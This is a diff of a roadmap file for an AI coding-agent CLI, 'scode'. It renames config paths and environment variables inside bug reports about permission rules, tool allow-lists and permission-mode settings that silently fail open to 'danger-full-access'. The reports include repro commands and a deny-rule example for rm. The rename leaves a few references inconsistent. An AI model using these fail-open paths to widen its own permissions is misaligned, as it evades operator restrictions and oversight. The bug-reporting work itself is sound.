     1. *Silent non-enforcement of safety rules.* An operator who writes `"deny":["Bash(rm:*)"]` expecting rm to be denied gets **no** enforcement on two independent failure modes: (a) the tool name `Bash` doesn't match the runtime's `bash`; (b) even if spelled correctly, a typo like `"Bsh(rm:*)"` accepts silently. Both produce the same observable state as "no rule configured" — `config: ok`, `permission_mode: ...`, indistinguishable from never having written the rule at all.
     2. *Cross-harness config-portability break.* ROADMAP's implicit goal of running existing `.mcp.json` / Claude Code configs on `scode` (see PARITY.md) assumes the convention overlap is wide. Case-sensitive tool-name matching breaks portability at the permission layer specifically, silently, in exactly the direction that fails *open* (permissive) rather than fails *closed* (denying unknown tools).
-    3. *No preflight audit surface.* Sudocodehip-style orchestrators cannot implement "refuse to spawn this lane unless it denies `Bash(rm:*)`" because they can't read the policy post-parse. They have to re-parse `.nexus/sudocode.json` themselves — which means they also have to re-implement the `parse_optional_permission_rules` + `PermissionRule::parse` semantics to match what scode actually loaded.
+    3. *No preflight audit surface.* Sudocodehip-style orchestrators cannot implement "refuse to spawn this lane unless it denies `Bash(rm:*)`" because they can't read the policy post-parse. They have to re-parse `.scode.json` themselves — which means they also have to re-implement the `parse_optional_permission_rules` + `PermissionRule::parse` semantics to match what scode actually loaded.
     4. *Runs contrary to the existing `--allowedTools` validation precedent.* The binary already knows the tool registry (as the `--allowedTools` error proves). Not threading the same list into the permission-rule parser is a small oversight with a large blast radius.
 
    **Fix shape — three pieces, each small.**
    1. *Validate rule tool names against the registered tool set at config-load time.* In `parse_optional_permission_rules`, call into the same tool-alias table used by `--allowedTools` normalization (likely `tools::normalize_tool_alias` or similar) and either (a) reject unknown names with `ConfigError::Parse`, or (b) capture them into `ConfigLoader::all_warnings` so a typo becomes visible in `doctor` without hard-failing startup. Option (a) is stricter; option (b) is less breaking for existing configs that already work by accident.
    2. *Case-fold the tool-name compare in `PermissionRule::matches`.* Normalize both sides to lowercase (or to the registry's canonical casing) before the `!=` compare. Covers the `Bash` vs `bash` ecosystem-convention gap. Document the normalization in `USAGE.md` / `CLAUDE.md`.
-   3. *Expose loaded permission rules in `status` and `doctor` JSON.* Add `workspace.permission_rules: { allow: [...], deny: [...], ask: [...] }` to status JSON (each entry carrying `raw`, `resolved_tool_name`, `matcher`, and an `unknown_tool: bool` flag that flips true when the tool name didn't match the registry). Emit a `permission_rules` doctor check that reports `Warn` when any loaded rule references an unknown tool. Sudocodehip can now preflight on a typed field instead of re-parsing `.nexus/sudocode.json`.
+   3. *Expose loaded permission rules in `status` and `doctor` JSON.* Add `workspace.permission_rules: { allow: [...], deny: [...], ask: [...] }` to status JSON (each entry carrying `raw`, `resolved_tool_name`, `matcher`, and an `unknown_tool: bool` flag that flips true when the tool name didn't match the registry). Emit a `permission_rules` doctor check that reports `Warn` when any loaded rule references an unknown tool. Sudocodehip can now preflight on a typed field instead of re-parsing `.scode.json`.
 
    **Acceptance.** A typo'd `"deny":["Bsh(rm:*)"]` produces a visible warning in `scode doctor` (and/or a hard error if piece 1(a) is chosen) naming the offending rule. `"deny":["Bash(rm:*)"]` actually denies `bash` invocations (via piece 2). `scode --output-format json status` exposes the resolved rule set so orchestrators can audit policy without re-parsing config.
 
@@ -2174,7 +2174,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
    **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdK` on main HEAD `8db8e49` in response to Sudocodehip pinpoint nudge at `1494751832399024178`. A partial regression of ROADMAP #39 / #54 — the filter was applied to the primary slash-command listing and to REPL completions, but the `--help` Resume-safe one-liner was overlooked. New stubs added to `STUB_COMMANDS` since those filings keep propagating to this section. Sibling to #78 (`scode plugins` CLI route wired but never constructed): both are "surface advertises something that doesn't work at runtime" gaps in `--help` / parser coverage. Distinct from the truth-audit / discovery-overreach / reporting-surface clusters — this is a self-contradicting help surface, not a runtime-state or config-hygiene bug.
 
-97. **`--allowedTools ""` and `--allowedTools ",,"` silently yield an empty allow-set that blocks every tool, with no error, no warning, and no trace of the active tool-restriction anywhere in `scode status` / `scode doctor` / `scode --output-format json` surfaces — compounded by `allowedTools` being a *rejected unknown key* in `.nexus/sudocode.json`, so there is no machine-readable way to inspect or recover what the current active allow-set actually is** — dogfooded 2026-04-18 on main HEAD `3ab920a` from `/tmp/cdL`. `--allowedTools "nonsense"` correctly returns a structured error naming every valid tool. `--allowedTools ""` silently produces `Some(BTreeSet::new())` and all subsequent tool lookups fail `contains()` because the set is empty. Neither `status` JSON nor `doctor` JSON exposes `allowed_tools`, so an agent that accidentally restricted itself to zero tools has no observable signal to recover from.
+97. **`--allowedTools ""` and `--allowedTools ",,"` silently yield an empty allow-set that blocks every tool, with no error, no warning, and no trace of the active tool-restriction anywhere in `scode status` / `scode doctor` / `scode --output-format json` surfaces — compounded by `allowedTools` being a *rejected unknown key* in `.scode.json`, so there is no machine-readable way to inspect or recover what the current active allow-set actually is** — dogfooded 2026-04-18 on main HEAD `3ab920a` from `/tmp/cdL`. `--allowedTools "nonsense"` correctly returns a structured error naming every valid tool. `--allowedTools ""` silently produces `Some(BTreeSet::new())` and all subsequent tool lookups fail `contains()` because the set is empty. Neither `status` JSON nor `doctor` JSON exposes `allowed_tools`, so an agent that accidentally restricted itself to zero tools has no observable signal to recover from.
 
     **Concrete repro.**
     ```
@@ -2192,10 +2192,10 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
     $ ~/agents/sudo-code/rust/target/release/scode --allowedTools "nonsense" --output-format json doctor
     {"error":"unsupported tool in --allowedTools: nonsense (expected one of: bash, read_file, write_file, edit_file, glob_search, grep_search, WebFetch, WebSearch, TodoWrite, Skill, Agent, ToolSearch, NotebookEdit, Sleep, SendUserMessage, Config, EnterPlanMode, ExitPlanMode, StructuredOutput, REPL, PowerShell, AskUserQuestion, TaskCreate, RunTaskPacket, TaskGet, TaskList, TaskStop, TaskUpdate, TaskOutput, WorkerCreate, WorkerGet, WorkerObserve, WorkerResolveTrust, WorkerAwaitReady, WorkerSendPrompt, WorkerRestart, WorkerTerminate, WorkerObserveCompletion, TeamCreate, TeamDelete, CronCreate, CronDelete, CronList, LSP, ListMcpResources, ReadMcpResource, McpAuth, RemoteTrigger, MCP, TestingPermission)","type":"error"}
     # exit 0 with structured error — works as intended
-    $ echo '{"allowedTools":["Read"]}' > .nexus/sudocode.json
+    $ echo '{"allowedTools":["Read"]}' > .scode.json
     $ ~/agents/sudo-code/rust/target/release/scode --output-format json doctor | jq '.summary'
     {"failures": 1, "ok": 3, "total": 6, "warnings": 2}
-    # .nexus/sudocode.json "allowedTools" → fail: `unknown key "allowedTools" (line 2)`
+    # .scode.json "allowedTools" → fail: `unknown key "allowedTools" (line 2)`
     # config-file form is rejected; only CLI flag is the knob — and the CLI flag has the silent-empty footgun
     $ ~/agents/sudo-code/rust/target/release/scode --allowedTools "Read" --output-format json status | jq 'keys'
     ["kind", "model", "permission_mode", "sandbox", "usage", "workspace"]
@@ -2220,28 +2220,28 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
       ```
       With `values = [""]` the inner `token` iterator produces zero elements (all filtered by `!token.is_empty()`). The error-producing branch never runs. `allowed` stays empty. Returns `Ok(Some(BTreeSet::new()))` — an *active* allow-set with zero entries.
     - `rust/crates/tools/src/lib.rs:247-278` — `GlobalToolRegistry::definitions(allowed_tools: Option<&BTreeSet<String>>)` filters each tool by `allowed_tools.is_none_or(|allowed| allowed.contains(name))`. `None` → all pass. `Some(empty)` → zero pass. So the silent-empty set silently disables every tool.
-    - `rust/crates/runtime/src/config.rs:2008-2035` — `.nexus/sudocode.json` with `allowedTools` is asserted to produce `unknown key "allowedTools" (line 2)` validation failure. Config-file form is explicitly *not supported*; the CLI flag is the only knob.
+    - `rust/crates/runtime/src/config.rs:2008-2035` — `.scode.json` with `allowedTools` is asserted to produce `unknown key "allowedTools" (line 2)` validation failure. Config-file form is explicitly *not supported*; the CLI flag is the only knob.
     - `rust/crates/rusty-claude-cli/src/main.rs` (status JSON builder around `:4951`) — status output emits `kind, model, permission_mode, sandbox, usage, workspace`. No `allowed_tools` field. Doctor report (same file) emits auth, config, install_source, workspace, sandbox, system checks. No tool-restriction check.
 
     **Why this is specifically a automatability gap.**
     1. *Silent vs. loud asymmetry for equivalent mis-input.* Typo `--allowedTools "nonsens"` → loud structured error naming every valid tool. Typo `--allowedTools ""` (likely produced by a shell variable that expanded to empty: `--allowedTools "$TOOLS"`) → silent zero-tool lane. Shell interpolation failure modes land in the silent branch.
     2. *No observable recovery surface.* An agent that booted with `--allowedTools ""` has no way to tell from `scode status`, `scode --output-format json status`, or `scode doctor` that its tool surface is empty. Every diagnostic says "ok." Failures surface only when the agent tries to call a tool and gets denied — pushing the problem to runtime prompt failures instead of preflight.
-    3. *Config-file surface is locked out.* `.nexus/sudocode.json` cannot declare `allowedTools` — it fails validation with "unknown key." So a team that wants committed, reviewable tool-restriction policy has no path; they can only pass CLI flags at boot. And the CLI flag has the silent-empty footgun. Asymmetric hygiene.
-    4. *Semantically ambiguous.* `--allowedTools ""` could reasonably mean (a) "no restriction, fall back to default," (b) "restrict to nothing, disable all tools," or (c) "invalid, error." The current behavior is silently (b) — the most surprising and least recoverable option. Compare to `.nexus/sudocode.json` where `"allowedTools": []` would be an explicit array literal — but that surface is disabled entirely.
+    3. *Config-file surface is locked out.* `.scode.json` cannot declare `allowedTools` — it fails validation with "unknown key." So a team that wants committed, reviewable tool-restriction policy has no path; they can only pass CLI flags at boot. And the CLI flag has the silent-empty footgun. Asymmetric hygiene.
+    4. *Semantically ambiguous.* `--allowedTools ""` could reasonably mean (a) "no restriction, fall back to default," (b) "restrict to nothing, disable all tools," or (c) "invalid, error." The current behavior is silently (b) — the most surprising and least recoverable option. Compare to `.scode.json` where `"allowedTools": []` would be an explicit array literal — but that surface is disabled entirely.
     5. *Adds to the permission-audit cluster.* #50 / #87 / #91 / #94 already cover permission-mode / permission-rule validation, default dangers, parser disagreement, and rule typo tolerance. #97 covers the *tool-allow-list* axis of the same problem: the knob exists, parses empty input silently, disables all tools, and hides its own active value from every diagnostic surface.
 
     **Fix shape — small validator tightening + diagnostic surfacing.**
     1. *Reject empty-token input at parse time.* In `normalize_allowed_tools` (tools/src/lib.rs:192), after the inner token loop, if the accumulated `allowed` set is empty *and* `values` was non-empty, return `Err("--allowedTools was provided with no usable tool names (got '{raw}'). To restrict to no tools explicitly, pass --allowedTools none; to remove the restriction, omit the flag.")`. ~10 lines.
     2. *Support an explicit "none" sentinel if the "zero tools" lane is actually desirable.* If an agent legitimately wants "zero tools, purely conversational," accept `--allowedTools none` / `--allowedTools ""` with an explicit opt-in. But reject the ambiguous silent path.
     3. *Surface active allow-set in `status` JSON and `doctor` JSON.* Add a top-level `allowed_tools: {source: "flag"|"config"|"default", entries: [...]}` field to the status JSON builder (main.rs `:4951`). Add a `tool_restrictions` doctor check that reports the active allow-set and flags suspicious shapes (empty, single tool, missing Read/Bash for a coding lane). ~40 lines across status + doctor.
-    4. *Accept `allowedTools` (or a safer alternative name) in `.nexus/sudocode.json`.* Or emit a clearer error pointing to the CLI flag as the correct surface. Right now `allowedTools` is silently treated as "unknown field," which is technically correct but operationally hostile — the user typed a plausible key name and got a generic schema failure.
+    4. *Accept `allowedTools` (or a safer alternative name) in `.scode.json`.* Or emit a clearer error pointing to the CLI flag as the correct surface. Right now `allowedTools` is silently treated as "unknown field," which is technically correct but operationally hostile — the user typed a plausible key name and got a generic schema failure.
     5. *Regression tests.* One for `normalize_allowed_tools(&[""])` returning `Err`. One for `--allowedTools ""` on the CLI returning a non-zero exit with a structured error. One for status JSON exposing `allowed_tools` when the flag is active.
 
-    **Acceptance.** `scode --allowedTools "" doctor` exits non-zero with a structured error pointing at the ambiguous input (or succeeds with an *explicit* empty allow-set if `--allowedTools none` is the opt-in). `scode --allowedTools "Read" --output-format json status` exposes `allowed_tools.entries: ["read_file"]` at the top level. `scode --output-format json doctor` includes a `tool_restrictions` check reflecting the active allow-set source + entries. `.nexus/sudocode.json` with `allowedTools` either loads successfully or fails with an error that names the CLI flag as the correct surface.
+    **Acceptance.** `scode --allowedTools "" doctor` exits non-zero with a structured error pointing at the ambiguous input (or succeeds with an *explicit* empty allow-set if `--allowedTools none` is the opt-in). `scode --allowedTools "Read" --output-format json status` exposes `allowed_tools.entries: ["read_file"]` at the top level. `scode --output-format json doctor` includes a `tool_restrictions` check reflecting the active allow-set source + entries. `.scode.json` with `allowedTools` either loads successfully or fails with an error that names the CLI flag as the correct surface.
 
     **Blocker.** None. Tightening the parser is ~10 lines. Surfacing the active allow-set in status JSON is ~15 lines. Adding the doctor check is ~25 lines. Accepting `allowedTools` in config — or improving its rejection message — is ~10 lines. All tractable in one small PR.
 
-    **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdL` on main HEAD `3ab920a` in response to Sudocodehip pinpoint nudge at `1494759381068419115`. Joins the **permission-audit sweep** (#50 / #87 / #91 / #94) on a new axis: those four cover permission *modes* and *rules*; #97 covers the *tool-allow-list* knob with the same class of problem (silent input handling + missing diagnostic visibility). Also sibling of **#86** (corrupt `.nexus/sudocode.json` silently dropped, doctor reports ok) on the truth-audit side: both are "misconfigured agents have no observable signal." Natural 3-way bundle: **#86 + #94 + #97** all add diagnostic coverage to `scode doctor` for configuration hygiene the current surface silently swallows.
+    **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdL` on main HEAD `3ab920a` in response to Sudocodehip pinpoint nudge at `1494759381068419115`. Joins the **permission-audit sweep** (#50 / #87 / #91 / #94) on a new axis: those four cover permission *modes* and *rules*; #97 covers the *tool-allow-list* knob with the same class of problem (silent input handling + missing diagnostic visibility). Also sibling of **#86** (corrupt `.scode.json` silently dropped, doctor reports ok) on the truth-audit side: both are "misconfigured agents have no observable signal." Natural 3-way bundle: **#86 + #94 + #97** all add diagnostic coverage to `scode doctor` for configuration hygiene the current surface silently swallows.
 
 98. **`--compact` is silently ignored outside the `Prompt → Text` path: `--compact --output-format json` (explicitly documented as "text mode only" in `--help` but unenforced), `--compact status`, `--compact doctor`, `--compact sandbox`, `--compact init`, `--compact export`, `--compact mcp`, `--compact skills`, `--compact agents`, and `scode --compact` with piped stdin (hardcoded `compact: false` at the stdin fallthrough). No error, no warning, no diagnostic trace anywhere** — dogfooded 2026-04-18 on main HEAD `7a172a2` from `/tmp/cdM`. `--help` at `main.rs:8251` explicitly documents "`--compact` (text mode only; useful for piping)"; the implementation *knows* the flag is only meaningful for the text branch of the prompt turn output, but does not refuse or warn in any other case. An agent piping output through `scode --compact --output-format json prompt "..."` gets the same verbose JSON blob as without the flag, silently, with no indication that its documented behavior was discarded.
 
@@ -2473,28 +2473,28 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdU` + `/tmp/cdO*` scratch repos on main HEAD `63a0d30` in response to Sudocodehip pinpoint nudge at `1494782026660712672`. Cross-cluster find: primary cluster is **truth-audit / diagnostic-integrity** (joins #80–#87, #89) — the status/doctor JSON lies by omission about the git state it claims to report. Secondary cluster is **silent-flag / documented-but-unenforced** (joins #96, #97, #98, #99) — the `--base-commit` flag is a silent no-op on status/doctor. Tertiary cluster is **unplumbed-subsystem** — `runtime::stale_base` is fully implemented but only reachable via stderr in the Prompt/Repl paths; this is the same shape as the `scode plugins` CLI route being wired but never constructed (#78). Natural bundle candidates: **#89 + #100** (git-state completeness sweep — #89 adds mid-operation states, #100 adds commit identity + stale-base + upstream); **#78 + #96 + #100** (unplumbed-surface triangle — CLI route never wired, help-listing unfiltered, subsystem present but JSON-invisible). Hits the roadmap's own Product Principle #4 and Phase 2 §4.2 directly — making this pinpoint the most load-bearing of the 20 items filed this dogfood session for the "branch freshness" product thesis. Milestone: ROADMAP #100.
 
-101. **`RUSTY_CLAUDE_PERMISSION_MODE` env var silently swallows any invalid value — including common typos and valid-config-file aliases — and falls through to the ultimate default `danger-full-access`. A lane that sets `export RUSTY_CLAUDE_PERMISSION_MODE=readonly` (missing hyphen), `read_only` (underscore), `READ-ONLY` (case), `dontAsk` (config-file alias not recognized at env-var path), or any garbage string gets the LEAST safe mode silently, while `--permission-mode readonly` loudly errors. The env var itself is also undocumented — not referenced in `--help`, README, or any docs — an undocumented knob with fail-open semantics** — dogfooded 2026-04-18 on main HEAD `d63d58f` from `/tmp/cdV`. Matrix of tested values: `"read-only"` / `"workspace-write"` / `"danger-full-access"` / `" read-only "` all work. `""` / `"garbage"` / `"redonly"` / `"readonly"` / `"read_only"` / `"READ-ONLY"` / `"ReadOnly"` / `"dontAsk"` / `"readonly\n"` all silently resolve to `danger-full-access`.
+101. **`SUDO_CODE_PERMISSION_MODE` env var silently swallows any invalid value — including common typos and valid-config-file aliases — and falls through to the ultimate default `danger-full-access`. A lane that sets `export SUDO_CODE_PERMISSION_MODE=readonly` (missing hyphen), `read_only` (underscore), `READ-ONLY` (case), `dontAsk` (config-file alias not recognized at env-var path), or any garbage string gets the LEAST safe mode silently, while `--permission-mode readonly` loudly errors. The env var itself is also undocumented — not referenced in `--help`, README, or any docs — an undocumented knob with fail-open semantics** — dogfooded 2026-04-18 on main HEAD `d63d58f` from `/tmp/cdV`. Matrix of tested values: `"read-only"` / `"workspace-write"` / `"danger-full-access"` / `" read-only "` all work. `""` / `"garbage"` / `"redonly"` / `"readonly"` / `"read_only"` / `"READ-ONLY"` / `"ReadOnly"` / `"dontAsk"` / `"readonly\n"` all silently resolve to `danger-full-access`.
 
      **Concrete repro.**
      ```
-     $ RUSTY_CLAUDE_PERMISSION_MODE="readonly" scode --output-format json status | jq '.permission_mode'
+     $ SUDO_CODE_PERMISSION_MODE="readonly" scode --output-format json status | jq '.permission_mode'
      "danger-full-access"
      # typo 'readonly' (missing hyphen) — silent fallback to most permissive mode
 
-     $ RUSTY_CLAUDE_PERMISSION_MODE="read_only" scode --output-format json status | jq '.permission_mode'
+     $ SUDO_CODE_PERMISSION_MODE="read_only" scode --output-format json status | jq '.permission_mode'
      "danger-full-access"
      # underscore variant — silent fallback
 
-     $ RUSTY_CLAUDE_PERMISSION_MODE="READ-ONLY" scode --output-format json status | jq '.permission_mode'
+     $ SUDO_CODE_PERMISSION_MODE="READ-ONLY" scode --output-format json status | jq '.permission_mode'
      "danger-full-access"
      # case-sensitive — silent fallback
 
-     $ RUSTY_CLAUDE_PERMISSION_MODE="dontAsk" scode --output-format json status | jq '.permission_mode'
+     $ SUDO_CODE_PERMISSION_MODE="dontAsk" scode --output-format json status | jq '.permission_mode'
      "danger-full-access"
      # config-file alias dontAsk accidentally "works" because the ultimate default is ALSO danger-full-access
      # — but via the wrong path (fallback, not alias resolution); indistinguishable from typos
 
-     $ RUSTY_CLAUDE_PERMISSION_MODE="garbage" scode --output-format json status | jq '.permission_mode'
+     $ SUDO_CODE_PERMISSION_MODE="garbage" scode --output-format json status | jq '.permission_mode'
      "danger-full-access"
      # pure garbage — silent fallback; operator never learns their env var was invalid
 
@@ -2505,14 +2505,14 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # Env var is undocumented in --help
      $ scode --help | grep -i RUSTY_CLAUDE
      (empty)
-     # No mention of RUSTY_CLAUDE_PERMISSION_MODE anywhere in the user-visible surface
+     # No mention of SUDO_CODE_PERMISSION_MODE anywhere in the user-visible surface
      ```
 
      **Trace path.**
      - `rust/crates/rusty-claude-cli/src/main.rs:1099-1107` — `default_permission_mode`:
        ```rust
        fn default_permission_mode() -> PermissionMode {
-           env::var("RUSTY_CLAUDE_PERMISSION_MODE")
+           env::var("SUDO_CODE_PERMISSION_MODE")
                .ok()
                .as_deref()
                .and_then(normalize_permission_mode)     // returns None on invalid
@@ -2536,27 +2536,27 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
        No typo tolerance. No case-insensitive match. No support for the config-file aliases (`default`, `plan`, `acceptEdits`, `auto`, `dontAsk`) that `parse_permission_mode_label` in `runtime/src/config.rs:855-863` accepts. Two parsers, different accepted sets, no shared source of truth.
      - `rust/crates/runtime/src/config.rs:855-863` — `parse_permission_mode_label` accepts 7 aliases (`default` / `plan` / `read-only` / `acceptEdits` / `auto` / `workspace-write` / `dontAsk` / `danger-full-access`) and returns a structured `Err(ConfigError::Parse(...))` on unknown values — the config path is loud. Env path is silent.
      - `rust/crates/rusty-claude-cli/src/main.rs:1095` — `permission_mode_from_label` panics on an unknown label with `unsupported permission mode label`. This panic path is unreachable from the env-var flow because `normalize_permission_mode` filters first. But the panic message itself proves the code knows these strings are not interchangeable — the env flow just does not surface that.
-     - Documentation search: `grep -rn RUSTY_CLAUDE_PERMISSION_MODE` in README / docs / `--help` output returns zero hits. The env var is internal plumbing with no operator-facing surface.
+     - Documentation search: `grep -rn SUDO_CODE_PERMISSION_MODE` in README / docs / `--help` output returns zero hits. The env var is internal plumbing with no operator-facing surface.
 
      **Why this is specifically a automatability gap.**
      1. *Fail-OPEN to the least safe mode.* An operator whose intent is "restrict this lane to read-only" typos the env var and gets `danger-full-access`. The failure mode lets a lane have *more* permission than requested, not less. Every other silent-no-op finding in the #96–#100 cluster fails closed (flag does nothing) or fails inert (no effect). This one fails *open* — the operator's safety intent is silently downgraded to the most permissive setting. Qualitatively more severe than #97 / #98 / #100.
-     2. *CLI vs env asymmetry.* `--permission-mode readonly` errors loudly. `RUSTY_CLAUDE_PERMISSION_MODE=readonly` silently degrades to `danger-full-access`. Same input, same misspelling, opposite outcomes. Operators who moved their permission setting from CLI flag to env var (reasonable practice — flags are per-invocation, env vars are per-shell) will land on the silent-degrade path.
+     2. *CLI vs env asymmetry.* `--permission-mode readonly` errors loudly. `SUDO_CODE_PERMISSION_MODE=readonly` silently degrades to `danger-full-access`. Same input, same misspelling, opposite outcomes. Operators who moved their permission setting from CLI flag to env var (reasonable practice — flags are per-invocation, env vars are per-shell) will land on the silent-degrade path.
      3. *Undocumented knob.* The env var is not mentioned in `--help`, not in README, not anywhere user-facing. Reference-check via grep returns only source hits. An undocumented internal knob is bad enough; an undocumented internal knob with fail-open semantics compounds the severity because operators who discover it (by reading source or via leakage) are exactly the population least likely to have it reviewed or audited.
      4. *Parser asymmetry with config.* Config accepts `dontAsk` / `plan` / `default` / `acceptEdits` / `auto` (per #91). Env var accepts none of those. Operators migrating config → env or env → config hit silent degradation in both directions when an alias is involved. #91 captured the config↔CLI axis; this captures the config↔env axis and the CLI↔env axis, completing the triangle.
-     5. *"dontAsk" via env accidentally works for the wrong reason.* `RUSTY_CLAUDE_PERMISSION_MODE=dontAsk` resolves to `danger-full-access` not because the env parser understands the alias, but because `normalize_permission_mode` rejects it (returns None), falls through to config (also None in a fresh workspace), and lands on the fail-open ultimate default. The correct mapping and the typo mapping produce the same observable result, making debugging impossible — an operator testing their env config has no way to tell whether the alias was recognized or whether they fell through to the unsafe default.
+     5. *"dontAsk" via env accidentally works for the wrong reason.* `SUDO_CODE_PERMISSION_MODE=dontAsk` resolves to `danger-full-access` not because the env parser understands the alias, but because `normalize_permission_mode` rejects it (returns None), falls through to config (also None in a fresh workspace), and lands on the fail-open ultimate default. The correct mapping and the typo mapping produce the same observable result, making debugging impossible — an operator testing their env config has no way to tell whether the alias was recognized or whether they fell through to the unsafe default.
      6. *Joins the permission-audit sweep on a new axis.* #50 / #87 / #91 / #94 / #97 cover permission-mode defaults, CLI↔config parser disagreement, tool-allow-list, and rule validation. #101 covers the env-var input path — the third and final input surface for permission mode. Completes the three-way input-surface audit (CLI / config / env).
 
      **Fix shape — reject invalid env values loudly; share a single permission-mode parser across all three input surfaces; document the knob.**
      1. *Rewrite `default_permission_mode` to surface invalid env values.* Change the `.and_then(normalize_permission_mode)` pattern to match on the env read result and return a `Result` that the caller displays. Something like:
         ```rust
         fn default_permission_mode() -> Result<PermissionMode, String> {
-            if let Some(env_value) = env::var("RUSTY_CLAUDE_PERMISSION_MODE").ok() {
+            if let Some(env_value) = env::var("SUDO_CODE_PERMISSION_MODE").ok() {
                 let trimmed = env_value.trim();
                 if !trimmed.is_empty() {
                     return normalize_permission_mode(trimmed)
                         .map(permission_mode_from_label)
                         .ok_or_else(|| format!(
-                            "RUSTY_CLAUDE_PERMISSION_MODE has unsupported value '{env_value}'. Use read-only, workspace-write, or danger-full-access."
+                            "SUDO_CODE_PERMISSION_MODE has unsupported value '{env_value}'. Use read-only, workspace-write, or danger-full-access."
                         ));
                 }
             }
@@ -2565,23 +2565,23 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
         ```
         Callers propagate the error the same way `--permission-mode` rejection propagates today. ~15 lines in `default_permission_mode` plus ~5 lines at each caller to unwrap the Result. Alternative: emit a warning to stderr and still fall back to a safe (not fail-open) default like `read-only` — but that trades operator surprise for safer default; architectural choice.
      2. *Share one parser across CLI / config / env.* Extract `parse_permission_mode_label` from `runtime/src/config.rs:855` into a shared helper used by all three input surfaces. Decide on a canonical accepted set: either the broad 7-alias set (preserves back-compat with existing configs that use `dontAsk` / `plan` / `default` / etc.) or the narrow 3-canonical set (cleaner but breaks existing configs). Pick one; enforce everywhere. Closes the parser-disagreement axis that #91 flagged on the config↔CLI boundary; this PR extends it to the env boundary. ~30 lines.
-     3. *Document the env var.* Add `RUSTY_CLAUDE_PERMISSION_MODE` to `scode --help` "Environment variables" section (if one exists — add it if not). Reference it in README permission-mode section. ~10 lines across help string and docs.
-     4. *Rename the env var (optional).* `RUSTY_CLAUDE_PERMISSION_MODE` predates the `scode` / sudo-code rename. A forward-looking fix would add `SCODE_PERMISSION_MODE` as the canonical name with `RUSTY_CLAUDE_PERMISSION_MODE` kept as a deprecated alias with a one-time stderr warning. ~15 lines; not strictly required for this bug but natural alongside the audit.
+     3. *Document the env var.* Add `SUDO_CODE_PERMISSION_MODE` to `scode --help` "Environment variables" section (if one exists — add it if not). Reference it in README permission-mode section. ~10 lines across help string and docs.
+     4. *Rename the env var (optional).* `SUDO_CODE_PERMISSION_MODE` predates the `scode` / sudo-code rename. A forward-looking fix would add `SCODE_PERMISSION_MODE` as the canonical name with `SUDO_CODE_PERMISSION_MODE` kept as a deprecated alias with a one-time stderr warning. ~15 lines; not strictly required for this bug but natural alongside the audit.
      5. *Regression tests.* One per rejected env value. One per valid env value (idempotence). One for the env+config interaction (env takes precedence over config). One for the "dontAsk" in env case (should error, not fall through silently).
      6. *Add a doctor check.* `scode doctor` should surface `permission_mode: {source: "flag"|"env"|"config"|"default", value: "<mode>"}` so an operator can verify the resolved mode matches their intent. Complements #97's proposed `allowed_tools` surface in status JSON and #100's `base_commit` surface; together they add visibility for the three primary permission-axis inputs. ~20 lines.
 
-     **Acceptance.** `RUSTY_CLAUDE_PERMISSION_MODE=readonly scode status` exits non-zero with a structured error naming the invalid value and the accepted set. `RUSTY_CLAUDE_PERMISSION_MODE=dontAsk scode status` either resolves correctly via the shared parser (if the broad alias set is chosen) or errors loudly (if the narrow set is chosen) — no more accidental fall-through to the ultimate default. `scode doctor` JSON exposes the resolved `permission_mode` with `source` attribution. `scode --help` documents the env var.
+     **Acceptance.** `SUDO_CODE_PERMISSION_MODE=readonly scode status` exits non-zero with a structured error naming the invalid value and the accepted set. `SUDO_CODE_PERMISSION_MODE=dontAsk scode status` either resolves correctly via the shared parser (if the broad alias set is chosen) or errors loudly (if the narrow set is chosen) — no more accidental fall-through to the ultimate default. `scode doctor` JSON exposes the resolved `permission_mode` with `source` attribution. `scode --help` documents the env var.
 
      **Blocker.** None. Parser-unification is ~30 lines. Env rejection is ~15 lines. Docs are ~10 lines. The broad-vs-narrow accepted-set decision is the only architectural question and can be resolved by checking existing user configs for alias usage; if `dontAsk` / `plan` / etc. are uncommon, narrow the set; if common, keep broad.
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdV` on main HEAD `d63d58f` in response to Sudocodehip pinpoint nudge at `1494789577687437373`. Joins the **permission-audit sweep** (#50 / #87 / #91 / #94 / #97 / #101) on the env-var axis — the third and final permission-mode input surface. #50 (merge-edge cases), #87 (fresh-workspace default), #91 (CLI↔config parser mismatch), #94 (permission-rule validation), #97 (tool-allow-list), and now #101 (env-var silent fail-open) together audit every input surface for permission configuration. Cross-cluster with **silent-flag / documented-but-unenforced** (#96–#100) but qualitatively worse than that bundle: this is fail-OPEN, not fail-inert. And cross-cluster with **truth-audit** (#80–#87, #89, #100) because the operator has no way to verify the resolved permission_mode's source. Natural bundle: the six-way permission-audit sweep (#50 + #87 + #91 + #94 + #97 + **#101**) — the end-state cleanup that closes the entire permission-input attack surface in one pass.
 
-102. **`scode mcp list` / `scode mcp show` / `scode doctor` surface MCP servers at *configure-time* only — no preflight, no liveness probe, not even a `command-exists-on-PATH` check. A `.nexus/sudocode.json` pointing at `/does/not/exist` as an MCP server command cheerfully reports `found: true` in `mcp show`, `configured_servers: 1` in `mcp list`, `MCP servers: 1` in `doctor` config check, and `status: ok` overall. The actual reachability / startup failure only surfaces when the agent tries to *use* a tool from that server mid-turn — exactly the diagnostic surprise the Roadmap's Phase 2 §4 "Canonical lane event schema" and Product Principle #5 "Partial success is first-class" were written to avoid** — dogfooded 2026-04-18 on main HEAD `eabd257` from `/tmp/cdW2`. A three-server config with 2 broken commands currently shows up everywhere as "Config: ok, MCP servers: 3." An orchestrating scode cannot tell from JSON alone which of its tool surfaces will actually respond.
